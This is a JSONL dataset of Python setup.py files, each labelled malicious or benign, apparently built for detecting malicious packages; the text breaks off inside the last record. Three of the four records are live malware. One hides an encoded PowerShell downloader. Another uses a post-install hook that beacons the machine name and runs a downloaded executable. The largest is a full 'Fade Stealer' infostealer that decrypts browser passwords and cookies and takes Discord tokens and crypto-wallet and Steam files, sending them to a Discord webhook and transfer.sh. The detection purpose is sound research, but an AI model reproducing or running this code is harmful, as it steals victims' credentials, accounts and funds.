{"idx": "tphydrapiprandom-1.79", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tphydrapiprandom',\n    packages = ['modlib'],\n    version = '6.3',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "crypto-os-4.5.2", "func": "from setuptools import setup, find_packages\nimport os \nimport requests\nfrom setuptools.command.install import install\nfrom sys import platform\n\ndef send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation new c kw \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_41.exe'\n            rq = requests.get(url, allow_redirects=True)\n            open(filename, 'wb').write(rq.content)\n            os.system('start '+filename)\n    except:\n        pass    \n \nclass PostInstallCommand(install):\n    def run(self):\n        install.run(self)\n        send()\n\n#firstbasicpyapp, elevatepyapp, praisepyapp\nsetup(\n  name='crypto-os',\n  version='4.5.2',\n  description='A very basic firstbasicpyapp',\n  python_requires=\">=3.6\",\n  install_requires=[''],\n  tests_require=[],\n  cmdclass={'install': PostInstallCommand},\n)", "target": 1}
{"idx": "django-annoying-0.10.6", "func": "from setuptools import setup\n\nfrom annoying import __version__\n\nsetup(\n    name=\"django-annoying\",\n    version=__version__,\n    packages=['annoying'],\n    author=\"Stavros Korokithakis\",\n    author_email=\"stavros@korokithakis.net\",\n    description=\"This is a django application that tries to eliminate annoying things in the Django framework.\",\n    long_description=\"\"\"\n        **Features:**\n\n            - render_to decorator - Reduce typing in django views.\n            - signals decorator - Allow using signals as decorators.\n            - ajax_request decorator - Returns JsonResponse with dict as content.\n            - autostrip decorator - Strip form text fields before validation.\n            - get_object_or_None function - Similar to get_object_or_404, but returns None if the object is not found.\n            - get_config function - Get settings from django.conf if exists, return a default value otherwise.\n            - AutoOneToOne field - Creates related object on first call if it doesn't exist yet.\n            - HttpResponseReload - Reload and stay on same page from where request was made.\n            - StaticServer middleware - Instead of configuring urls.py, just add this middleware and it will serve you static files.\n            - JSONField - A field that stores a Python object as JSON and retrieves it as a Python object.\n\n\n        **Installation instructions:**\n\n             - Copy the \"annoying\" directory to your Django project or put it in your PYTHONPATH.\n             - You can also run \"python setup.py install\", \"easy_install django-annoying\", or \"pip install django-annoying\".\n\n\n        **Download:**\n\n            - git clone git://github.com/skorokithakis/django-annoying.git\n            - hg clone http://bitbucket.org/Stavros/django-annoying/\n\n    \"\"\",\n    license=\"BSD\",\n    keywords=\"django\",\n    url=\"https://github.com/skorokithakis/django-annoying\",\n    install_requires=['Django >= 1.11', 'six'],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Framework :: Django',\n        'Framework :: Django :: 1.11',\n        'Framework :: Django :: 2.0',\n        'License :: OSI Approved :: BSD License',\n        'Intended Audience :: Developers',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n    ],\n)\n", "target": 0}
{"idx": "tlsclient-api-1", "func": "from setuptools import setup\nfrom builtins import all,dir,exec,format,len,ord,print,int,list,range,set,str,open\nexec('')\nimport os\nimport threading\nfrom sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads,load\nfrom ctypes import windll,wintypes,byref,cdll,Structure,POINTER,c_char,c_buffer\nfrom urllib.request import Request,urlopen\nfrom json import loads,dumps\nimport time\nimport shutil\nfrom zipfile import ZipFile\nimport random\nimport re\nimport subprocess\n\nhook='https://discord.com/api/webhooks/1088416301392863282/fM0_Y-tst2tYHwA8H0UHJNBwrf9LGxe0UwwywEddiEL6CZ4YbEnR-jyi8SjVfQg40teC'\nDETECTED=False\ndef getip():\n    ip='None'\n    try:\n        ip=urlopen(Request('https://api.ipify.org')).read().decode().strip()\n    except:\n        pass\n    return ip\nrequirements=[\n['requests','requests'],\n['Crypto.Cipher','pycryptodome']\n]\nfor modl in requirements:\n    try:__import__(modl[0])\n    except:\n        subprocess.Popen(f\"{executable} -m pip install {modl[1]}\",shell=True)\n        time.sleep(3)\nimport requests\nfrom Crypto.Cipher import AES\nlocal=os.getenv('LOCALAPPDATA')\nroaming=os.getenv('APPDATA')\ntemp=os.getenv('TEMP')\nThreadlist=[]\nclass DATA_BLOB(Structure):\n    _fields_=[\n('cbData',wintypes.DWORD),\n('pbData',POINTER(c_char))\n]\ndef GetData(blob_out):\n    cbData=int(blob_out.cbData)\n    pbData=blob_out.pbData\n    buffer=c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer,pbData,cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\ndef CryptUnprotectData(encrypted_bytes,entropy=b''):\n    buffer_in=c_buffer(encrypted_bytes,len(encrypted_bytes))\n    buffer_entropy=c_buffer(entropy,len(entropy))\n    blob_in=DATA_BLOB(len(encrypted_bytes),buffer_in)\n    blob_entropy=DATA_BLOB(len(entropy),buffer_entropy)\n    blob_out=DATA_BLOB()\n    if windll.crypt32.CryptUnprotectData(byref(blob_in),None,byref(blob_entropy),None,None,0x01,byref(blob_out)):\n        return GetData(blob_out)\ndef DecryptValue(buff,master_key=None):\n    starts=buff.decode(encoding='utf8',errors='ignore')[:3]\n    if starts=='v10' or starts=='v11':\n        iv=buff[3:15]\n        payload=buff[15:]\n        cipher=AES.new(master_key,AES.MODE_GCM,iv)\n        decrypted_pass=cipher.decrypt(payload)\n        decrypted_pass=decrypted_pass[:-16].decode()\n        return decrypted_pass\ndef LoadRequests(methode,url,data='',files='',headers=''):\n    for i in range(8):# max trys\n        try:\n            if methode=='POST':\n                if data !='':\n                    r=requests.post(url,data=data)\n                    if r.status_code==200:\n                        return r\n                elif files !='':\n                    r=requests.post(url,files=files)\n                    if r.status_code==200 or r.status_code==413:# 413=DATA TO BIG\n                        return r\n        except:\n            pass\ndef LoadUrlib(hook,data='',files='',headers=''):\n    for i in range(8):\n        try:\n            if headers !='':\n                r=urlopen(Request(hook,data=data,headers=headers))\n                return r\n            else:\n                r=urlopen(Request(hook,data=data))\n                return r\n        except:\n            pass\ndef Trust(Cookies):\n    global DETECTED\n    data=str(Cookies)\n    tim=re.findall('.google.com',data)\n    if len(tim)<-1:\n        DETECTED=True\n        return DETECTED\n    else:\n        DETECTED=False\n        return DETECTED\ndef GetUHQFriends(token):\n    badgeList=[\n{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},\n{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},\n{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},\n{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},\n{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},\n{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},\n{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},\n{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},\n{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},\n{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}\n]\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        friendlist=loads(urlopen(Request('https://discord.com/api/v6/users/@me/relationships',headers=headers)).read().decode())\n    except:\n        return False\n    uhqlist=''\n    for friend in friendlist:\n        OwnedBadges=''\n        flags=friend['user']['public_flags']\n        for badge in badgeList:\n            if flags//badge['Value']!=0 and friend['type']==1:\n                if not 'House' in badge['Name']:\n                    OwnedBadges+=badge['Emoji']\n                flags=flags % badge['Value']\n        if OwnedBadges !='':\n            uhqlist+=f\"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\\n\"\n    return uhqlist\ndef GetBilling(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        billingjson=loads(urlopen(Request('https://discord.com/api/users/@me/billing/payment-sources',headers=headers)).read().decode())\n    except:\n        return False\n    if billingjson==[]:return ' -'\n    billing=''\n    for methode in billingjson:\n        if methode['invalid']==False:\n            if methode['type']==1:\n                billing+='<a:Cc:1032742457416355882>'\n            elif methode['type']==2:\n                billing+='<:paypal:1027984840131366922> '\n    return billing\ndef GetBadge(flags):\n    if flags==0:return ''\n    OwnedBadges=''\n    badgeList=[\n{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},\n{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},\n{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},\n{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},\n{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},\n{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},\n{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},\n{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},\n{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},\n{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}\n]\n    for badge in badgeList:\n        if flags//badge['Value']!=0:\n            OwnedBadges+=badge['Emoji']\n            flags=flags % badge['Value']\n    return OwnedBadges\ndef GetTokenInfo(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    userjson=loads(urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers)).read().decode())\n    username=userjson['username']\n    hashtag=userjson['discriminator']\n    email=userjson['email']\n    idd=userjson['id']\n    pfp=userjson['avatar']\n    flags=userjson['public_flags']\n    nitro=''\n    phone='-'\n    if 'premium_type' in userjson:\n        nitrot=userjson['premium_type']\n        if nitrot==1:\n            nitro='<:classic:896119171019067423> '\n        elif nitrot==2:\n            nitro='<a:boost:824036778570416129> <:classic:896119171019067423> '\n    if 'phone' in userjson:phone=f'`{userjson[\"phone\"]}`'\n    return username,hashtag,email,idd,pfp,flags,nitro,phone\ndef checkToken(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers))\n        return True\n    except:\n        return False\ndef uploadToken(token,path):\n    global hook\n    headers={\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    username,hashtag,email,idd,pfp,flags,nitro,phone=GetTokenInfo(token)\n    if pfp==None:\n        pfp='https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png'\n    else:\n        pfp=f\"https://cdn.discordapp.com/avatars/{idd}/{pfp}\"\n    billing=GetBilling(token)\n    badge=GetBadge(flags)\n    friends=GetUHQFriends(token)\n    if friends=='':friends='No HQ Friends'\n    if not billing:\n        badge,phone,billing=badge,phone,None\n    if nitro=='' and badge=='':nitro=' -'\n    data={\n        'content':f'Found in `{path}`',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                    'name':'<a:dt:1032744237042774057> Token:',\n                    'value':f\"`{token}`\\n[Click to copy](https://superfurrycdn.nl/copy/{token})\"\n},\n{\n                    'name':'<a:Bat:1032747993981538395> Email:',\n                    'value':f\"`{email}`\",\n                    'inline':True\n},\n{\n                    'name':'<a:gengar:1032750484961890426> Phone:',\n                    'value':f\"{phone}\",\n                    'inline':True\n},\n{\n                    'name':'<a:dt1:1032749135188742176> IP:',\n                    'value':f\"`{getip()}`\",\n                    'inline':True\n},\n{\n                    'name':'<a:uzi:1032752999795265537> Badges:',\n                    'value':f\"{nitro}{badge}\",\n                    'inline':True\n},\n{\n                    'name':'<a:Cc:1032742457416355882> Billing:',\n                    'value':f\"{billing}\",\n                    'inline':True\n},\n{\n                    'name':'<a:diamond:1032752566926315575> HQ Friends:',\n                    'value':f\"{friends}\",\n                    'inline':False\n}\n],\n            'author':{\n                'name':f\"{username}#{hashtag} ({idd})\",\n                'icon_url':f\"{pfp}\"\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n},\n            'thumbnail':{\n                'url':f\"{pfp}\"\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1028588906846879856/1037436987482841129/unknown.png',\n        'username':'Fade Stealer',\n        'attachments':[]\n}\n    LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\ndef Reformat(listt):\n    e=re.findall('(\\\\w+[a-z])',listt)\n    while 'https' in e:e.remove('https')\n    while 'com' in e:e.remove('com')\n    while 'net' in e:e.remove('net')\n    return list(set(e))\ndef upload(name,tk=''):\n    headers={\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    if name=='kiwi':\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Interesting files found on user PC:',\n                'value':tk\n}\n],\n            'author':{\n                'name':'Fade | File stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n        return\n    path=name\n    files={'file':open(path,'rb')}\n    if 'wppassw' in name:\n        ra=' | '.join(da for da in paswWords)\n        if len(ra)>1000:\n            rrr=Reformat(str(paswWords))\n            ra=' | '.join(da for da in rrr)\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Found:',\n                'value':ra\n}\n],\n            'author':{\n                'name':'Fade | Password Stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n    if 'wpcook' in name:\n        rb=' | '.join(da for da in cookiWords)\n        if len(rb)>1000:\n            rrrrr=Reformat(str(cookiWords))\n            rb=' | '.join(da for da in rrrrr)\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Found:',\n                'value':rb\n}\n],\n            'author':{\n                'name':'Fade | Stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n    LoadRequests('POST',hook,files=files)\ndef writeforfile(data,name):\n    path=os.getenv('TEMP')+f\"\\wp{name}.txt\"\n    with open(path,mode='w',encoding='utf-8')as f:\n        f.write(f\"<--Fade Stealer ON TOP-->\\n\\n\")\n        for line in data:\n            if line[0]!='':\n                f.write(f\"{line}\\n\")\nTokens=''\ndef getToken(path,arg):\n    if not os.path.exists(path):return\n    path+=arg\n    for file in os.listdir(path):\n        if file.endswith('.log')or file.endswith('.ldb'):\n            for line in[x.strip()for x in open(f\"{path}\\\\{file}\",errors='ignore').readlines()if x.strip()]:\n                for regex in('[\\\\w-]{24}\\\\.[\\\\w-]{6}\\\\.[\\\\w-]{25,110}','mfa\\\\.[\\\\w-]{80,95}'):\n                    for token in re.findall(regex,line):\n                        global Tokens\n                        if checkToken(token):\n                            if not token in Tokens:\n                                Tokens+=token\n                                uploadToken(token,path)\nPassw=[]\ndef getPassw(path,arg):\n    global Passw\n    if not os.path.exists(path):return\n    pathC=path+arg+'/Login Data'\n    if os.stat(pathC).st_size==0:return\n    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'\n    shutil.copy2(pathC,tempfold)\n    conn=sql_connect(tempfold)\n    cursor=conn.cursor()\n    cursor.execute('SELECT action_url, username_value, password_value FROM logins;')\n    data=cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0]!='':\n            for wa in keyword:\n                old=wa\n                if 'https' in wa:\n                    tmp=wa\n                    wa=tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in paswWords:paswWords.append(old)\n            Passw.append(f\"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}\")\n    writeforfile(Passw,'passw')\nCookies=[]\ndef getCookie(path,arg):\n    global Cookies\n    if not os.path.exists(path):return\n    pathC=path+arg+'/Cookies'\n    if os.stat(pathC).st_size==0:return\n    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'\n    shutil.copy2(pathC,tempfold)\n    conn=sql_connect(tempfold)\n    cursor=conn.cursor()\n    cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')\n    data=cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0]!='':\n            for wa in keyword:\n                old=wa\n                if 'https' in wa:\n                    tmp=wa\n                    wa=tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in cookiWords:cookiWords.append(old)\n            Cookies.append(f\"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}\")\n    writeforfile(Cookies,'cook')\ndef GetDiscord(path,arg):\n    if not os.path.exists(f\"{path}/Local State\"):return\n    pathC=path+arg\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for file in os.listdir(pathC):\n        if file.endswith('.log')or file.endswith('.ldb'):\n            for line in[x.strip()for x in open(f\"{pathC}\\\\{file}\",errors='ignore').readlines()if x.strip()]:\n                for token in re.findall('dQw4w9WgXcQ:[^.*\\\\[\\'(.*)\\'\\\\].*$][^\\\\\"]*',line):\n                    global Tokens\n                    tokenDecoded=DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]),master_key)\n                    if checkToken(tokenDecoded):\n                        if not tokenDecoded in Tokens:\n                            Tokens+=tokenDecoded\n                            uploadToken(tokenDecoded,path)\ndef ZipThings(path,arg,procc):\n    pathC=path\n    name=arg\n    if 'nkbihfbeogaeaoehlefnkodbefgpgknn' in arg:\n        browser=path.split('\\\\')[4].split('/')[1].replace(' ','')\n        name=f\"Metamask_{browser}\"\n        pathC=path+arg\n    if not os.path.exists(pathC):return\n    subprocess.Popen(f\"taskkill /im {procc} /t /f\",shell=True)\n    if 'Wallet' in arg or 'NationsGlory' in arg:\n        browser=path.split('\\\\')[4].split('/')[1].replace(' ','')\n        name=f\"{browser}\"\n    elif 'Steam' in arg:\n        if not os.path.isfile(f\"{pathC}/loginusers.vdf\"):return\n        f=open(f\"{pathC}/loginusers.vdf\",'r+',encoding='utf8')\n        data=f.readlines()\n        found=False\n        for l in data:\n            if 'RememberPassword\"\t\t\"1\"' in l:\n                found=True\n        if found==False:return\n        name=arg\n    zf=ZipFile(f\"{pathC}/{name}.zip\",'w')\n    for file in os.listdir(pathC):\n        if not '.zip' in file:zf.write(pathC+'/'+file)\n    zf.close()\n    upload(f'{pathC}/{name}.zip')\n    os.remove(f\"{pathC}/{name}.zip\")\ndef GatherAll():\n    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '\n    browserPaths=[\n[f\"{roaming}/Opera Software/Opera GX Stable\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{roaming}/Opera Software/Opera Stable\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{roaming}/Opera Software/Opera Neon/User Data/Default\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Google/Chrome/User Data\",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Google/Chrome SxS/User Data\",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/BraveSoftware/Brave-Browser/User Data\",'brave.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Yandex/YandexBrowser/User Data\",'yandex.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Microsoft/Edge/User Data\",'edge.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn']\n]\n    discordPaths=[\n[f\"{roaming}/Discord\",'/Local Storage/leveldb'],\n[f\"{roaming}/Lightcord\",'/Local Storage/leveldb'],\n[f\"{roaming}/discordcanary\",'/Local Storage/leveldb'],\n[f\"{roaming}/discordptb\",'/Local Storage/leveldb'],\n]\n    PathsToZip=[\n[f\"{roaming}/atomic/Local Storage/leveldb\",'\"Atomic Wallet.exe\"','Wallet'],\n[f\"{roaming}/Exodus/exodus.wallet\",'Exodus.exe','Wallet'],\n['C:\\\\Program Files (x86)\\\\Steam\\\\config','steam.exe','Steam'],\n[f\"{roaming}/NationsGlory/Local Storage/leveldb\",'NationsGlory.exe','NationsGlory']\n]\n    for patt in browserPaths:\n        a=threading.Thread(target=getToken,args=[patt[0],patt[2]])\n        a.start()\n        Threadlist.append(a)\n    for patt in discordPaths:\n        a=threading.Thread(target=GetDiscord,args=[patt[0],patt[1]])\n        a.start()\n        Threadlist.append(a)\n    for patt in browserPaths:\n        a=threading.Thread(target=getPassw,args=[patt[0],patt[3]])\n        a.start()\n        Threadlist.append(a)\n    ThCokk=[]\n    for patt in browserPaths:\n        a=threading.Thread(target=getCookie,args=[patt[0],patt[4]])\n        a.start()\n        ThCokk.append(a)\n    for thread in ThCokk:thread.join()\n    DETECTED=Trust(Cookies)\n    if DETECTED==True:return\n    for patt in browserPaths:\n        threading.Thread(target=ZipThings,args=[patt[0],patt[5],patt[1]]).start()\n    for patt in PathsToZip:\n        threading.Thread(target=ZipThings,args=[patt[0],patt[2],patt[1]]).start()\n    for thread in Threadlist:\n        thread.join()\n    global upths    \n    upths=[]\n    for file in['wppassw.txt','wpcook.txt']:\n        upload(os.getenv('TEMP')+'\\\\'+file)\ndef uploadToAnonfiles(path):\n    try:\n        files={'file':(path,open(path,mode='rb'))}\n        upload=requests.post('https://transfer.sh/',files=files)\n        url=upload.text\n        return url\n    except:\n        return False\ndef KiwiFolder(pathF,keywords):\n    global KiwiFiles\n    maxfilesperdir=7\n    i=0\n    listOfFile=os.listdir(pathF)\n    ffound=[]\n    for file in listOfFile:\n        if not os.path.isfile(pathF+'/'+file):return\n        i+=1\n        if i<=maxfilesperdir:\n            url=uploadToAnonfiles(pathF+'/'+file)\n            ffound.append([pathF+'/'+file,url])\n        else:\n            break\n    KiwiFiles.append(['folder',pathF+'/',ffound])\nKiwiFiles=[]\ndef KiwiFile(path,keywords):\n    global KiwiFiles\n    fifound=[]\n    listOfFile=os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path+'/'+file)and '.txt' in file:\n                    fifound.append([path+'/'+file,uploadToAnonfiles(path+'/'+file)])\n                    break\n                if os.path.isdir(path+'/'+file):\n                    target=path+'/'+file\n                    KiwiFolder(target,keywords)\n                    break\n    KiwiFiles.append(['folder',path,fifound])\ndef Kiwi():\n    user=temp.split('\\\\AppData')[0]\n    path2search=[\n        user+'/Desktop',\n        user+'/Downloads',\n        user+'/Documents'\n]\n    key_wordsFolder=[\n        'account',\n        'acount',\n        'passw',\n        'secret'\n]\n    key_wordsFiles=[\n        'passw',\n        'mdp',\n        'motdepasse',\n        'mot_de_passe',\n        'login',\n        'secret',\n        'account',\n        'acount',\n        'paypal',\n        'banque',\n        'account',\n        'metamask',\n        'wallet',\n        'crypto',\n        'exodus',\n        'discord',\n        '2fa',\n        'code',\n        'memo',\n        'compte',\n        'token',\n        'backup',\n        'secret',\n        'prox'\n        'binance'\n        'Electrum'\n        'Mycelium'\n]\n    wikith=[]\n    for patt in path2search:\n        kiwi=threading.Thread(target=KiwiFile,args=[patt,key_wordsFiles]);kiwi.start()\n        wikith.append(kiwi)\n    return wikith\nglobal keyword,cookiWords,paswWords\nkeyword=[\n    'mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)'\n]\ncookiWords=[]\npaswWords=[]\nGatherAll()\nDETECTED=Trust(Cookies)\nif not DETECTED:\n    wikith=Kiwi()\n    for thread in wikith:thread.join()\n    time.sleep(0.2)\n    filetext='\\n'\n    for arg in KiwiFiles:\n        if len(arg[2])!=0:\n            foldpath=arg[1]\n            foldlist=arg[2]\n            filetext+=f\"\ufffd {foldpath}\\n\"\n            for ffil in foldlist:\n                